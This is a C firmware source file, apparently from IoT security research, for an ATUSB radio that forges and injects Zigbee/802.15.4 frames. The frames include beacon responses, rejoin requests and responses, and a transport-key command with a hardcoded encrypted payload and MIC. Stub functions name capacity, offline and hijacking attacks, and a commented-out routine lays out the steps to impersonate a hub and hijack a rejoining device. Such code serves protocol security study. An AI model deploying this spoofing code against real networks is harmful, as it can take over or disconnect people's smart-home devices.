/*
 * fw/attacks/attack_12.c
 *
 * Written 2021 by Jincheng
 * Copyright 2021 Jincheng Wang
 *
 */
#include "attack.h"

extern uint8_t rejoin_full_flag;
extern uint8_t beacon_request_flag;
extern uint8_t tc_rejoin_request_flag;
extern uint8_t data_request_flag;

uint8_t count = 0;
unsigned char length = 0;
uint16_t FCF = 0;
unsigned char seqno = 0;
unsigned char cmd = 0;

//unsigned char encrypted_payload[35] = {
//		0x1f, 0xd0, 0x09, 0x1b, 0xb8, \
//		0x1f, 0x19, 0x7d, 0x4e, 0x50, \
//		0x1c, 0xea, 0x75, 0xc9, 0xe0, \
//		0xd1, 0x88, 0x39, 0xc1, 0x3e, \
//		0xda, 0x8f, 0x53, 0x6f, 0x14, \
//		0x70, 0x60, 0x5a, 0xb1, 0xca, \
//		0x0f, 0xda, 0x22, 0xd3, 0x0e \
//	};



/********  Transciver Library ********/


void set_rx_aack(rx_aack_config* aack_config)
{
	// This function is mostly called when there is packets being sent. So first make sure that current packet has been sent out.
	uint8_t reg_status = reg_read(REG_TRX_STATUS & TRX_STATUS_MASK);
	if (!aack_config->pass_ARET_check)
	{
		while(reg_status != TRX_STATUS_TX_ARET_ON)
		{
			reg_status = reg_read(REG_TRX_STATUS & TRX_STATUS_MASK);
			_delay_us(REG_CHANGE_DELAY);
		}
	}
	// In order to reply an ACK automaticlly, we need to first transit to PLL_ON, then transit into RX_AACK state
	change_state(TRX_CMD_FORCE_PLL_ON);
	reg_status = reg_read(REG_TRX_STATUS & TRX_STATUS_MASK);
	while(reg_status != TRX_STATUS_PLL_ON) {
		reg_status = reg_read(REG_TRX_STATUS & TRX_STATUS_MASK);
		_delay_us(REG_CHANGE_DELAY);
	}
	// Here we need to configure address for AACK, then transist into AACK mode
	reg_write(REG_SHORT_ADDR_0, aack_config->target_short_addr.addr_bytes[0]);
	reg_write(REG_SHORT_ADDR_1, aack_config->target_short_addr.addr_bytes[1]);
	reg_write(REG_PAN_ID_0, aack_config->target_pan_id.addr_bytes[0]);
	reg_write(REG_PAN_ID_1, aack_config->target_pan_id.addr_bytes[1]);

	// Set registers used by RX_AACK. Please refer to Page 55 in AT86RF231 spec.
	reg_write(0x0c, 0x00);
	reg_write(0x17, 0x02); // AACK_ACK_TIME: Send ACK quickly. Default value for 0x17: 0x00
	reg_write(0x2c, 0x38);
	if(!aack_config->dis_ack) {
		reg_write(0x2e, 0xc2);
	}
	else {
		reg_write(0x2e, 0xc2 | AACK_DIS_ACK);
	}
	if(aack_config->pending) {
		uint8_t previous_value = reg_read(0x2e);
		reg_write(0x2e, previous_value | AACK_SET_PD);
	}
	
	// Transist to RX_AACK_ON mode
	change_state(TRX_CMD_RX_AACK_ON);
	reg_status = reg_read(REG_TRX_STATUS) & TRX_STATUS_MASK;
	// Finally, make sure the state transition is right
	while((reg_status != TRX_CMD_RX_AACK_ON) && (reg_status != TRX_STATUS_BUSY_RX_AACK))
	{
		reg_status = reg_read(REG_TRX_STATUS) & TRX_STATUS_MASK;
		_delay_us(REG_CHANGE_DELAY);
	}
}

/**
 * @brief  send_zbee_cmd: This is the framework for ATUSB to send packets
 * @note   
 * @param  layer:    	 Input: 1: MAC-Layer Command 2: NWK-Layer Command 3: APS-Layer Command
 * @param  command:  	 Input: The command ID which we want to send
 * @param  security: 	 Input: Security enable flags used in the frame
 * @param  dst_addr: 	 Input: dest addr information
 * @param  src_addr: 	 Input: src  addr information
 * @param  aack_config:  Input: user-defined aack_config
 * @retval None
 */
 
void send_zbee_cmd(uint8_t command, uint8_t security,
				   ieee802154_addr* dst_addr, ieee802154_addr* src_addr,
				   rx_aack_config* aack_config)
{
	uint8_t reg_status = (reg_read(REG_TRX_STATUS) & TRX_STATUS_MASK);
	// Before transforming the state and sending packets, wait for RX_AACK_BUSY to be done,
	// such that this sending functionality is done after ACK transmission.
	while((reg_status == TRX_STATUS_BUSY_RX_AACK) ||
		  (reg_status == TRX_STATUS_BUSY_RX_AACK_NOCLK) ||
		  (reg_status == TRX_STATUS_BUSY_RX) ||
		  (reg_status == TRX_STATUS_BUSY_TX) ||
		  (reg_status == TRX_STATUS_BUSY_TX_ARET))
	{
		_delay_us(REG_CHANGE_DELAY);
		reg_status = (reg_read(REG_TRX_STATUS) & TRX_STATUS_MASK);
	}

	reg_status = 0;

	change_state(TRX_CMD_FORCE_PLL_ON);
	while((reg_read(REG_TRX_STATUS) & TRX_STATUS_MASK) != TRX_STATUS_PLL_ON) {
		_delay_us(REG_CHANGE_DELAY);
	}

	spi_begin();
	spi_send(AT86RF230_BUF_WRITE);
	// Finally we applied hard-coded methods.
	switch (command) {
		case ZBEE_MAC_CMD_DATA_RQ:
			send_data_request(security, dst_addr, src_addr);
			break;
		case ZBEE_NWK_CMD_REJOIN_RQ :
			send_rejoin_request(security, dst_addr, src_addr);
			break;
		case ZBEE_NWK_CMD_REJOIN_RP :
			send_rejoin_response(security, dst_addr, src_addr);
			break;
		case ZBEE_MAC_CMD_BEACON_RP :
			send_beacon_response(security, dst_addr, src_addr);
			break;
		case ZBEE_APS_CMD_KEY_TRANSPORT :
			send_transport_key(security, dst_addr, src_addr);
			break;
		default :
			break;
	}
	spi_end();
	change_state(TRX_STATUS_TX_ARET_ON);
	while(reg_status != TRX_STATUS_TX_ARET_ON)
	{
		reg_status = reg_read(REG_TRX_STATUS & TRX_STATUS_MASK);
		_delay_us(REG_CHANGE_DELAY);
	}
	slp_tr();

	if (aack_config->aack_flag)
	{
		set_rx_aack(aack_config);
	}
	else
	{
		// If RX_AACK is not needed, here we simply transform the state to RX_ON
		change_state(TRX_CMD_RX_ON);
		// change_state(TRX_CMD_PLL_ON);
	}
}

static uint8_t spi_send_blocks(void *data, uint8_t size)
{
	uint8_t byte_count = 0 ;
	char* pdata = (char*)data;
	for(; byte_count < size; byte_count ++) {
		spi_send(*(pdata+byte_count));
	}

	assert(byte_count == size);
	return byte_count;
}

/********  END of Transciver Library *******/

/********  Command Library *******/
void send_data_request(uint8_t security, ieee802154_addr* dst_addr, ieee802154_addr* src_addr)
{
	count = 0;
	length = 10 + 2;
	FCF = 0x8863;
	seqno = 0xff;
	cmd = 0x04;

	count += spi_send_blocks(&length, sizeof(length));
	count += spi_send_blocks(&FCF, sizeof(FCF));
	count += spi_send_blocks(&seqno, sizeof(seqno));
	count += spi_send_blocks(&dst_addr->pan, sizeof(dst_addr->pan));
	count += spi_send_blocks(&dst_addr->short_addr, sizeof(dst_addr->short_addr));
	count += spi_send_blocks(&src_addr->short_addr, sizeof(src_addr->short_addr));
	count += spi_send_blocks(&cmd, sizeof(cmd));

	assert(count == length - 1);
}
void send_beacon_response(uint8_t security, ieee802154_addr* dst_addr, ieee802154_addr* src_addr)
{
	count = 0;
	length = 26 + 2;
	FCF = 0x8000;		
	seqno = 0xff;
	uint16_t super_frame = 0x0fff;
	if(src_addr->coordinator_flag)
	{
		super_frame = 0x4fff;
	}
	uint8_t GTS = 0x00;
	uint8_t pending = 0x00;
	uint8_t proto = 0x00;
	uint16_t beacon_field = 0x8422;
	unsigned char offset[] = {0xff, 0xff, 0xff};
	uint8_t update_id = src_addr->beacon_update_id;

	count += spi_send_blocks(&length, sizeof(length));
	
	// MAC Layer
	count += spi_send_blocks(&FCF, sizeof(FCF));
	count += spi_send_blocks(&seqno, sizeof(seqno));
	count += spi_send_blocks(&src_addr->pan, sizeof(src_addr->pan));
	count += spi_send_blocks(&src_addr->short_addr, sizeof(src_addr->short_addr));
	count += spi_send_blocks(&super_frame, sizeof(super_frame));

	// Beacon Payload
	count += spi_send_blocks(&GTS, sizeof(GTS));
	count += spi_send_blocks(&pending, sizeof(pending));
	count += spi_send_blocks(&proto, sizeof(proto));
	count += spi_send_blocks(&beacon_field, sizeof(beacon_field));
	count += spi_send_blocks(&src_addr->epan, sizeof(src_addr->epan));
	count += spi_send_blocks(offset, sizeof(offset));
	count += spi_send_blocks(&update_id, sizeof(update_id));

	assert(count == length - 1);
}
void send_rejoin_request(uint8_t security, ieee802154_addr* dst_addr, ieee802154_addr* src_addr)
{
	count = 0;
	length = 27 + 2;
	FCF = 0x8861;		
	seqno = 0xff;

	uint16_t NWK_FCF = 0x1009;
	uint8_t radius = 0x01;
	uint8_t nwk_seq = 0xff;

	uint8_t capability_info = 0x80;
	if (src_addr->device_type < 2)
	{
		// Here we send rejoin request in represnetative as a Full-Function Device
		capability_info |= 0x02;
	}
	if (src_addr->rx_when_idle)
	{
		capability_info |= 0x08;
	}

	cmd = 0x06;

	count += spi_send_blocks(&length, sizeof(length));

	// MAC Layer
	count += spi_send_blocks(&FCF, sizeof(FCF));
	count += spi_send_blocks(&seqno, sizeof(seqno));
	count += spi_send_blocks(&dst_addr->pan, sizeof(dst_addr->pan));
	count += spi_send_blocks(&dst_addr->short_addr, sizeof(dst_addr->short_addr));
	count += spi_send_blocks(&src_addr->short_addr, sizeof(src_addr->short_addr));

	// NWK Layer
	count += spi_send_blocks(&NWK_FCF, sizeof(NWK_FCF));
	count += spi_send_blocks(&dst_addr->short_addr, sizeof(dst_addr->short_addr));
	count += spi_send_blocks(&src_addr->short_addr, sizeof(src_addr->short_addr));
	count += spi_send_blocks(&radius, sizeof(radius));
	count += spi_send_blocks(&nwk_seq, sizeof(nwk_seq));
	count += spi_send_blocks(&src_addr->long_addr, sizeof(src_addr->long_addr));

	// NWK Payload
	count += spi_send_blocks(&cmd, sizeof(cmd));
	count += spi_send_blocks(&capability_info, sizeof(capability_info));

	assert(count == length - 1);

}
void send_rejoin_response(uint8_t security, ieee802154_addr* dst_addr, ieee802154_addr* src_addr)
{
	count = 0;
	length = 37 + 2;
	FCF = 0x8861;		
	seqno = 0xff;

	uint16_t NWK_FCF = 0x1809;
	uint8_t radius = 0x01;
	uint8_t nwk_seq = 0xff;
	uint8_t status = 0x00;

	cmd = 0x07;

	count += spi_send_blocks(&length, sizeof(length));

	// MAC Layer
	count += spi_send_blocks(&FCF, sizeof(FCF));
	count += spi_send_blocks(&seqno, sizeof(seqno));
	count += spi_send_blocks(&dst_addr->pan, sizeof(dst_addr->pan));
	count += spi_send_blocks(&dst_addr->short_addr, sizeof(dst_addr->short_addr));
	count += spi_send_blocks(&src_addr->short_addr, sizeof(src_addr->short_addr));

	// NWK Layer
	count += spi_send_blocks(&NWK_FCF, sizeof(NWK_FCF));
	count += spi_send_blocks(&dst_addr->short_addr, sizeof(dst_addr->short_addr));
	count += spi_send_blocks(&src_addr->short_addr, sizeof(src_addr->short_addr));
	count += spi_send_blocks(&radius, sizeof(radius));
	count += spi_send_blocks(&nwk_seq, sizeof(nwk_seq));
	count += spi_send_blocks(&dst_addr->long_addr, sizeof(dst_addr->long_addr));
	count += spi_send_blocks(&src_addr->long_addr, sizeof(src_addr->long_addr));

	// NWK Payload
	count += spi_send_blocks(&cmd, sizeof(cmd));
	// TODO: Here we can replace the 16-bit address to assign a new address.
	// By default, we let assigned new address equal to ZED's previous addr
	count += spi_send_blocks(&dst_addr->short_addr, sizeof(dst_addr->short_addr));
	count += spi_send_blocks(&status, sizeof(status));

	assert(count == length - 1);

}
void send_transport_key(uint8_t security, ieee802154_addr* dst_addr, ieee802154_addr* src_addr)
{
	count = 0;
	length = 71 + 2;
	FCF = 0x8861;		
	seqno = 0xff;

	uint16_t NWK_FCF = 0x0008;
	uint8_t radius = 0x1e;
	uint8_t nwk_seq = 0xff;

	uint8_t APS_FCF = 0x21;
	uint8_t counter = 0xff;

	uint8_t APS_SCF = 0x30;
	// TODO: Here we may need to replace the frame_counter
	uint32_t frame_counter = 0xaaaaaaaa;

	count += spi_send_blocks(&length, sizeof(length));
	// MAC Layer
	count += spi_send_blocks(&FCF, sizeof(FCF));
	count += spi_send_blocks(&seqno, sizeof(seqno));
	count += spi_send_blocks(&dst_addr->pan, sizeof(dst_addr->pan));
	count += spi_send_blocks(&dst_addr->short_addr, sizeof(dst_addr->short_addr));
	count += spi_send_blocks(&src_addr->short_addr, sizeof(src_addr->short_addr));

	// NWK Layer
	count += spi_send_blocks(&NWK_FCF, sizeof(NWK_FCF));
	count += spi_send_blocks(&dst_addr->short_addr, sizeof(dst_addr->short_addr));
	count += spi_send_blocks(&src_addr->short_addr, sizeof(src_addr->short_addr));
	count += spi_send_blocks(&radius, sizeof(radius));
	count += spi_send_blocks(&nwk_seq, sizeof(nwk_seq));

	// APS Layer
	count += spi_send_blocks(&APS_FCF, sizeof(APS_FCF));
	count += spi_send_blocks(&counter, sizeof(counter));

	// Aux Security Header
	count += spi_send_blocks(&APS_SCF, sizeof(APS_SCF));
	count += spi_send_blocks(&frame_counter, sizeof(frame_counter));
	count += spi_send_blocks(&src_addr->long_addr, sizeof(src_addr->long_addr));
	// Because of unknown bugs (Maybe memory limitation, we can only send payload 5 bytes each time. (Total 35))
//unsigned char encrypted_payload[35] = {
//		0x1f, 0xd0, 0x09, 0x1b, 0xb8, \
//		0x1f, 0x19, 0x7d, 0x4e, 0x50, \
//		0x1c, 0xea, 0x75, 0xc9, 0xe0, \
//		0xd1, 0x88, 0x39, 0xc1, 0x3e, \
//		0xda, 0x8f, 0x53, 0x6f, 0x14, \
//		0x70, 0x60, 0x5a, 0xb1, 0xca, \
//		0x0f, 0xda, 0x22, 0xd3, 0x0e \
//	};
	unsigned char  encrypted_payload[5] = {0x1f, 0xd0, 0x09, 0x1b, 0xb8}; 
	count += spi_send_blocks(encrypted_payload, sizeof(encrypted_payload)); // 0-5
	encrypted_payload[0] = 0x1f; encrypted_payload[1] = 0x19; encrypted_payload[2] = 0x7d; encrypted_payload[3] = 0x4e; encrypted_payload[4] = 0x50;
	count += spi_send_blocks(encrypted_payload, sizeof(encrypted_payload)); // 5-10
	encrypted_payload[0] = 0x1c; encrypted_payload[1] = 0xea; encrypted_payload[2] = 0x75; encrypted_payload[3] = 0xc9; encrypted_payload[4] = 0xe0;
	count += spi_send_blocks(encrypted_payload, sizeof(encrypted_payload)); // 10-15
	encrypted_payload[0] = 0xd1; encrypted_payload[1] = 0x88; encrypted_payload[2] = 0x39; encrypted_payload[3] = 0xc1; encrypted_payload[4] = 0x3e;
	count += spi_send_blocks(encrypted_payload, sizeof(encrypted_payload)); // 15-20
	encrypted_payload[0] = 0xda; encrypted_payload[1] = 0x8f; encrypted_payload[2] = 0x53; encrypted_payload[3] = 0x6f; encrypted_payload[4] = 0x14;
	count += spi_send_blocks(encrypted_payload, sizeof(encrypted_payload)); // 20-25
	encrypted_payload[0] = 0x70; encrypted_payload[1] = 0x60; encrypted_payload[2] = 0x5a; encrypted_payload[3] = 0xb1; encrypted_payload[4] = 0xca;
	count += spi_send_blocks(encrypted_payload, sizeof(encrypted_payload)); // 25-30
	encrypted_payload[0] = 0x0f; encrypted_payload[1] = 0xda; encrypted_payload[2] = 0x22; encrypted_payload[3] = 0xd3; encrypted_payload[4] = 0x0e;
	count += spi_send_blocks(encrypted_payload, sizeof(encrypted_payload)); // 30-35

	// MIC
	unsigned char MIC[4] = {0xc6, 0xcd, 0xa7, 0xf6};
	count += spi_send_blocks(MIC, sizeof(MIC));
	assert(count == length - 1);
}

/********  END of Command Library *******/

/********  Attack-Specific Functions *******/
uint8_t capacity_attack(ieee802154_addr* hub_addr, uint64_t random_addr, uint8_t type)
{
	// Please check attack_12.c
	return 0;
}
uint8_t offline_attack(ieee802154_addr* hub_addr, ieee802154_addr* victim_addr, uint64_t random_addr)
{
	// Please check attack_13.c
	return 0;
}
uint8_t hijacking_attack(ieee802154_addr* hub_addr, ieee802154_addr* victim_addr, uint64_t random_addr)
{
	// Please check attack_13.c
	return 0;
}

//uint8_t hijacking_attack(ieee802154_addr* hub_addr, ieee802154_addr* victim_addr, uint64_t random_addr)
//{
//	ieee802154_addr fake_hub_addr = *hub_addr;
//	fake_hub_addr.short_addr = hub_addr->short_addr + 0x0001;
//	rx_aack_config aack_config = {};
//	aack_config.aack_flag = 0;
//	aack_config.dis_ack = 0;
//	aack_config.pending = 1;
//	aack_config.target_short_addr.addr = fake_hub_addr.short_addr;
//	aack_config.target_pan_id.addr = fake_hub_addr.pan;
//	
//	// Detect Beacon Request and Reply with Beacon Response
//	beacon_request_flag = 0;
//	while(!beacon_request_flag)
//	{
//		_delay_us(1);
//	}
//	send_zbee_cmd(ZBEE_MAC_CMD_BEACON_RP, 0,victim_addr, &fake_hub_addr, &aack_config);
//	// Wait for TC Rejoin Request. This delay is IMPORTANT.
//	tc_rejoin_request_flag = 0;
//	while(!tc_rejoin_request_flag)
//	{
//		_delay_us(1);
//	}
//	// We have detected an insecure Rejoin Request!
//	aack_config.aack_flag = 1;
//	aack_config.pass_ARET_check = 1;
//	set_rx_aack(&aack_config);
//
//	// 4. Detect Data Request and Send Rejoin Response Command.
//	data_request_flag = 0;
//	while(data_request_flag)
//	{
//		_delay_us(10);
//	}
//	led(1);
//	aack_config.pass_ARET_check = 0;
//	// send_zbee_cmd(ZBEE_NWK_CMD_REJOIN_RP, 0, victim_addr, &fake_hub_addr, &aack_config);
//	// 5. Detect Data Request and Send Transport Key Command.
//	// data_request_flag = 0;
////	while(!data_request_flag)
////	{
////		_delay_us(5);
////	}
//	// send_zbee_cmd(ZBEE_APS_CMD_KEY_TRANSPORT, 1, victim_addr, &fake_hub_addr, &aack_config);
//	return 1;
//}

/********  END of Attack-Specific Library *******/